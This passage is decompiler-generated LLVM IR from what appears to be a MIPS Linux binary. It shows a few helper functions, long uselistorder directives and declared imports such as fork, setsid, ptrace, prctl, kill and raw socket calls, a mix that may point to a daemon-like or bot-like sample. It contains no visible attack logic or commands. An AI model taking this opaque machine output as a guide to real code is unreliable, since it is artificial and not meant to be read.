  uselistorder i32* @a2, { 8, 9, 10, 11, 12, 13, 14, 15, 6, 5, 16, 7, 17, 18, 19, 2, 20, 21, 4, 22, 23, 0, 1, 24, 3, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48 }
  uselistorder label %dec_label_pc_407eb0, { 1, 0 }
}

define i32 @function_407ec0(i32 %arg1) local_unnamed_addr {
dec_label_pc_407ec0:
  %s1.global-to-local = alloca i32, align 4
  %v0_407ed0 = load i32, i32* @ra, align 4
  %v0_407ed4 = load i32, i32* @s0, align 4
  %v3_407edc = load i32, i32* @global_var_449224.411, align 4
  store i32 %v3_407edc, i32* @t9, align 4
  store i32 %arg1, i32* @s0, align 4
  %v2_407ee4 = call i32 @function_404a90()
  %v0_407ef0 = load i32, i32* @s0, align 4
  %v3_407ef4 = load i32, i32* @global_var_449228.412, align 4
  store i32 %v3_407ef4, i32* @t9, align 4
  store i32 %v0_407ed0, i32* @ra, align 4
  store i32 %v0_407ed4, i32* @s0, align 4
  %v6_407f04 = call i32 @function_404b50(i32 %v2_407ee4, i32 %v0_407ef0)
  %v1_407f18 = load i32, i32* @t9, align 4
  %v1_407f30 = add i32 %v1_407f18, 266968
  %v2_407f30 = inttoptr i32 %v1_407f30 to i32*
  %v3_407f30 = load i32, i32* %v2_407f30, align 4
  %v1_407f38 = add i32 %v3_407f30, -28668
  %v1_407f3c = add i32 %v3_407f30, -28672
  %v2_407f3c = inttoptr i32 %v1_407f3c to i32*
  %v3_407f3c = load i32, i32* %v2_407f3c, align 4
  %v2_407f44 = icmp eq i32 %v3_407f3c, -1
  br i1 %v2_407f44, label %dec_label_pc_407f68, label %dec_label_pc_407f48

dec_label_pc_407f48:                              ; preds = %dec_label_pc_407ec0
  store i32 -1, i32* %s1.global-to-local, align 4
  br label %dec_label_pc_407f50

dec_label_pc_407f50:                              ; preds = %dec_label_pc_407f50, %dec_label_pc_407f48
  %v1_407f50 = phi i32 [ %v2_407f50, %dec_label_pc_407f50 ], [ %v1_407f3c, %dec_label_pc_407f48 ]
  %v0_407f50 = phi i32 [ %v2_407f58, %dec_label_pc_407f50 ], [ %v3_407f3c, %dec_label_pc_407f48 ]
  %v2_407f50 = add i32 %v1_407f50, -4
  call void @__pseudo_call(i32 %v0_407f50)
  %v1_407f58 = inttoptr i32 %v2_407f50 to i32*
  %v2_407f58 = load i32, i32* %v1_407f58, align 4
  %v1_407f60 = load i32, i32* %s1.global-to-local, align 4
  %v2_407f60 = icmp eq i32 %v2_407f58, %v1_407f60
  br i1 %v2_407f60, label %dec_label_pc_407f68, label %dec_label_pc_407f50

dec_label_pc_407f68:                              ; preds = %dec_label_pc_407f50, %dec_label_pc_407ec0
  ret i32 %v1_407f38

; uselistorder directives
  uselistorder i32 %v2_407f58, { 1, 0 }
  uselistorder i32 -4, { 13, 4, 2, 14, 3, 5, 6, 7, 15, 8, 9, 1, 16, 10, 17, 11, 18, 19, 12, 20, 21, 0, 22, 23, 24, 25 }
  uselistorder i32 -1, { 110, 22, 111, 101, 112, 11, 12, 13, 113, 102, 114, 9, 10, 115, 116, 117, 17, 18, 19, 118, 119, 120, 121, 122, 14, 15, 16, 23, 123, 124, 125, 24, 103, 25, 126, 26, 27, 28, 127, 29, 128, 30, 129, 130, 75, 132, 131, 31, 133, 32, 134, 77, 135, 0, 136, 137, 104, 105, 138, 139, 106, 140, 78, 141, 79, 142, 7, 8, 143, 144, 145, 1, 33, 146, 147, 107, 148, 149, 80, 150, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 108, 109, 47, 151, 48, 49, 50, 51, 52, 53, 54, 55, 56, 152, 153, 57, 154, 58, 155, 59, 156, 60, 61, 62, 63, 64, 157, 65, 158, 66, 2, 159, 81, 3, 160, 76, 4, 161, 20, 162, 163, 67, 164, 82, 165, 83, 166, 84, 85, 86, 167, 168, 87, 169, 68, 69, 170, 70, 71, 171, 172, 173, 88, 174, 89, 175, 176, 177, 5, 178, 90, 179, 91, 92, 180, 93, 181, 94, 182, 21, 72, 95, 183, 96, 184, 73, 97, 185, 98, 6, 186, 74, 187, 188, 189, 99, 100 }
  uselistorder i32 (i32, i32)* @function_404b50, { 4, 3, 2, 1, 0 }
  uselistorder i32 ()* @function_404a90, { 1, 0 }
  uselistorder i32* @s0, { 5, 6, 7, 8, 9, 0, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 1, 24, 25, 26, 27, 28, 29, 30, 31, 2, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 52, 53, 54, 55, 56, 57, 58, 59, 60, 61, 62, 63, 64, 65, 66, 67, 68, 69, 70, 71, 72, 73, 3, 74, 75, 76, 77, 78, 79, 80, 81, 82, 83, 84, 85, 86, 87, 4, 88, 89, 90, 91, 92, 93, 94, 95, 96, 97, 98, 99, 100, 101, 102, 103, 104, 105, 106, 107, 108, 109, 110, 111, 112, 113, 114, 115, 116, 117, 118, 119, 120, 121, 122, 123, 124, 125, 126, 127, 128, 129, 130, 131, 132, 133, 134, 135, 136, 137, 138, 139, 140, 141, 142, 143, 144, 145, 146 }
  uselistorder i32 1, { 250, 3, 297, 401, 291, 402, 340, 339, 238, 239, 237, 235, 236, 1, 0, 403, 404, 276, 405, 277, 406, 407, 144, 142, 132, 133, 131, 143, 135, 137, 138, 139, 136, 140, 141, 134, 408, 409, 271, 272, 395, 13, 14, 15, 16, 17, 18, 21, 22, 19, 20, 24, 23, 27, 25, 26, 28, 31, 29, 30, 32, 10, 11, 166, 165, 12, 341, 201, 200, 253, 254, 245, 251, 342, 257, 267, 255, 259, 258, 261, 262, 263, 264, 266, 260, 265, 256, 396, 37, 34, 35, 36, 33, 330, 94, 38, 329, 100, 101, 102, 410, 411, 343, 106, 108, 104, 107, 111, 103, 109, 112, 110, 105, 278, 292, 412, 244, 413, 414, 338, 337, 336, 335, 150, 147, 145, 149, 148, 146, 298, 344, 252, 118, 113, 116, 115, 114, 117, 97, 96, 95, 162, 163, 164, 270, 268, 269, 279, 415, 345, 249, 246, 248, 247, 299, 300, 397, 348, 347, 346, 129, 130, 128, 243, 121, 242, 119, 81, 120, 127, 71, 72, 73, 98, 99, 349, 416, 273, 398, 66, 67, 350, 301, 399, 351, 352, 288, 353, 68, 69, 70, 7, 8, 9, 219, 155, 4, 5, 354, 154, 153, 152, 240, 241, 6, 151, 218, 217, 216, 80, 39, 215, 214, 417, 418, 419, 420, 40, 302, 356, 355, 421, 422, 303, 304, 76, 75, 74, 77, 423, 424, 425, 426, 427, 428, 429, 430, 357, 88, 91, 87, 89, 90, 431, 274, 187, 186, 432, 433, 92, 434, 435, 213, 436, 437, 438, 93, 439, 440, 305, 306, 334, 333, 332, 331, 84, 83, 86, 82, 85, 441, 442, 280, 293, 443, 307, 444, 308, 445, 446, 281, 447, 448, 400, 449, 450, 309, 310, 367, 366, 324, 365, 364, 363, 362, 361, 360, 359, 358, 193, 199, 189, 190, 191, 192, 198, 194, 197, 195, 196, 451, 369, 368, 126, 122, 123, 125, 124, 452, 453, 454, 455, 456, 457, 458, 275, 459, 460, 311, 461, 462, 312, 463, 464, 465, 466, 467, 468, 469, 470, 471, 472, 378, 377, 376, 375, 374, 325, 373, 372, 371, 370, 326, 175, 182, 176, 172, 173, 179, 181, 174, 180, 185, 178, 177, 183, 184, 473, 79, 78, 314, 474, 313, 475, 282, 476, 477, 283, 478, 315, 479, 480, 316, 317, 289, 481, 318, 319, 482, 320, 321, 483, 322, 484, 485, 389, 388, 387, 386, 385, 384, 383, 382, 327, 381, 380, 379, 42, 46, 41, 45, 43, 44, 486, 487, 488, 489, 223, 221, 220, 222, 224, 490, 491, 492, 493, 494, 495, 496, 497, 498, 499, 500, 284, 501, 502, 285, 286, 503, 294, 504, 505, 506, 507, 508, 509, 290, 510, 393, 392, 391, 390, 328, 203, 210, 212, 209, 207, 202, 206, 204, 208, 205, 211, 188, 511, 2, 512, 513, 514, 515, 161, 158, 157, 159, 160, 516, 517, 518, 171, 168, 167, 170, 169, 519, 520, 287, 323, 394, 234, 232, 228, 230, 231, 227, 226, 225, 233, 229, 156, 521, 522, 523, 524, 525, 52, 53, 50, 47, 60, 59, 58, 57, 56, 55, 54, 61, 48, 49, 51, 526, 64, 62, 63, 65, 527, 295, 296 }
}

define i32 @function_407f80() local_unnamed_addr {
dec_label_pc_407f80:
  %v0_407f94 = load i32, i32* @ra, align 4
  %v1_407fb0 = add i32 %v0_407f94, 266828
  %v2_407fb0 = inttoptr i32 %v1_407fb0 to i32*
  %v3_407fb0 = load i32, i32* %v2_407fb0, align 4
  %v1_407fb8 = add i32 %v3_407fb0, 288
  call void @__pseudo_call(i32 %v1_407fb8)
  %v4_407fd4 = load i32, i32* @v0, align 4
  ret i32 %v4_407fd4
}

define i32 @function_407fe4() local_unnamed_addr {
dec_label_pc_407fe4:
  %v0_407fe8 = load i32, i32* @v0, align 4
  ret i32 %v0_407fe8

; uselistorder directives
  uselistorder i32 0, { 157, 80, 147, 158, 159, 81, 160, 161, 13, 0, 162, 163, 164, 24, 165, 15, 166, 25, 167, 168, 169, 170, 171, 172, 173, 14, 174, 175, 176, 177, 178, 179, 180, 82, 181, 182, 83, 183, 184, 185, 186, 187, 188, 20, 189, 190, 191, 192, 193, 26, 194, 195, 196, 197, 198, 199, 200, 201, 202, 203, 29, 28, 84, 85, 204, 205, 206, 207, 208, 209, 27, 210, 86, 211, 30, 212, 213, 214, 87, 88, 1, 215, 216, 21, 217, 218, 219, 220, 221, 31, 222, 223, 224, 225, 226, 227, 228, 229, 230, 17, 231, 232, 233, 234, 235, 236, 2, 237, 238, 239, 240, 241, 242, 89, 243, 32, 69, 244, 245, 246, 247, 248, 249, 250, 251, 252, 3, 4, 155, 253, 9, 156, 254, 255, 256, 144, 257, 145, 258, 259, 260, 261, 262, 263, 264, 265, 266, 267, 268, 269, 270, 271, 272, 273, 274, 275, 276, 277, 278, 279, 280, 281, 282, 283, 284, 285, 286, 287, 288, 289, 290, 291, 292, 293, 146, 294, 295, 296, 297, 298, 299, 300, 301, 302, 303, 304, 33, 305, 34, 8, 35, 306, 307, 308, 36, 309, 310, 311, 312, 18, 19, 22, 37, 38, 40, 39, 41, 313, 314, 315, 316, 317, 318, 67, 16, 319, 320, 42, 321, 322, 323, 324, 325, 76, 326, 327, 328, 329, 330, 91, 331, 92, 332, 93, 333, 94, 334, 335, 148, 336, 337, 149, 338, 339, 340, 341, 342, 43, 343, 150, 344, 345, 346, 70, 71, 347, 348, 151, 349, 350, 44, 351, 352, 152, 353, 354, 355, 356, 90, 357, 358, 359, 95, 360, 153, 361, 362, 363, 364, 365, 5, 96, 366, 45, 367, 97, 98, 368, 369, 99, 100, 370, 371, 372, 373, 374, 101, 47, 46, 375, 376, 68, 48, 377, 378, 379, 380, 381, 382, 383, 384, 385, 386, 387, 388, 389, 390, 391, 103, 392, 393, 394, 395, 154, 396, 397, 104, 398, 399, 400, 105, 401, 402, 72, 403, 73, 106, 107, 108, 404, 405, 406, 74, 407, 408, 10, 11, 109, 110, 102, 75, 409, 410, 411, 412, 6, 413, 414, 415, 416, 417, 77, 418, 78, 419, 420, 421, 422, 423, 424, 425, 426, 427, 428, 429, 430, 431, 432, 23, 51, 50, 433, 49, 434, 435, 436, 437, 438, 439, 440, 441, 442, 7, 443, 63, 444, 52, 445, 53, 446, 64, 447, 54, 448, 55, 449, 65, 56, 450, 57, 451, 452, 453, 454, 455, 456, 457, 66, 458, 459, 460, 461, 462, 463, 464, 58, 465, 466, 12, 467, 111, 468, 79, 469, 60, 59, 61, 62, 112, 113, 114, 115, 116, 117, 118, 119, 120, 121, 122, 123, 124, 125, 126, 127, 128, 129, 130, 131, 132, 133, 134, 135, 136, 137, 138, 139, 140, 141, 142, 143, 470, 471, 472, 473, 474, 475, 476, 477, 478, 479, 480, 481, 482, 483, 484, 485, 486, 487, 488, 489 }
  uselistorder i32* @v0, { 5, 6, 35, 0, 36, 37, 38, 39, 4, 1, 40, 41, 7, 8, 10, 42, 11, 43, 12, 44, 45, 13, 46, 47, 14, 48, 3, 2, 49, 15, 16, 17, 18, 30, 31, 19, 50, 51, 52, 20, 21, 53, 22, 23, 24, 25, 54, 55, 56, 26, 27, 57, 58, 28, 59, 29, 60, 32, 33, 34, 9 }
}

declare i32 @unknown_0() local_unnamed_addr

declare i32 @fcntl(i32, i32, ...) local_unnamed_addr

declare i32 @chdir(i8*) local_unnamed_addr

declare i32 @close(i32) local_unnamed_addr

declare i32 @fork() local_unnamed_addr

declare i32 @getpid() local_unnamed_addr

declare i32 @getppid() local_unnamed_addr

declare i32 @kill(i32, i32) local_unnamed_addr

declare i32 @open(i8*, i32, ...) local_unnamed_addr

declare i32 @prctl(i32, i32, i32, i32, i32) local_unnamed_addr

declare i32 @ptrace(i32, ...) local_unnamed_addr

declare i32 @read(i32, i32*, i32) local_unnamed_addr

declare i32 @readlink(i8*, i8*, i32) local_unnamed_addr

declare i32 @setsid() local_unnamed_addr

declare i32 @sysinfo(%sysinfo*) local_unnamed_addr

declare i32 @time(i32*) local_unnamed_addr

declare i32 @unlink(i8*) local_unnamed_addr

declare i32 @write(i32, i32*, i32) local_unnamed_addr

declare i32 @accept(i32, %sockaddr*, i32*) local_unnamed_addr

declare i32 @bind(i32, %sockaddr*, i32) local_unnamed_addr

declare i32 @connect(i32, %sockaddr*, i32) local_unnamed_addr

declare i32 @getsockname(i32, %sockaddr*, i32*) local_unnamed_addr

declare i32 @getsockopt(i32, i32, i32, i32*, i32*) local_unnamed_addr

declare i32 @listen(i32, i32) local_unnamed_addr

declare i32 @recv(i32, i32*, i32, i32) local_unnamed_addr

declare i32 @recvfrom(i32, i32*, i32, i32, %sockaddr*, i32*) local_unnamed_addr

declare i32 @send(i32, i32*, i32, i32) local_unnamed_addr

declare i32 @sendto(i32, i32*, i32, i32, %sockaddr*, i32) local_unnamed_addr

declare i32 @setsockopt(i32, i32, i32, i32*, i32) local_unnamed_addr

declare i32 @socket(i32, i32, i32) local_unnamed_addr

declare i32 @sigaction(i32, %sigaction*, %sigaction*) local_unnamed_addr

declare void @exit(i32) local_unnamed_addr

declare i32 @fstat(i32, %stat*) local_unnamed_addr

declare i32 @getegid() local_unnamed_addr

declare i32 @geteuid() local_unnamed_addr

declare i32 @getgid() local_unnamed_addr

declare i32 @getuid() local_unnamed_addr

declare i32 @nanosleep(%timespec*, %timespec*) local_unnamed_addr

declare i32 @sigprocmask(i32, %_TYPEDEF_sigset_t*, %_TYPEDEF_sigset_t*) local_unnamed_addr

declare i32 @times(%tms*) local_unnamed_addr

declare i32 @brk(i32*) local_unnamed_addr

declare i32 @__decompiler_undefined_function_0() local_unnamed_addr

declare i8 @__decompiler_undefined_function_1() local_unnamed_addr

declare i16 @__decompiler_undefined_function_2() local_unnamed_addr

declare i8* @__decompiler_undefined_function_3() local_unnamed_addr

attributes #0 = { noreturn }
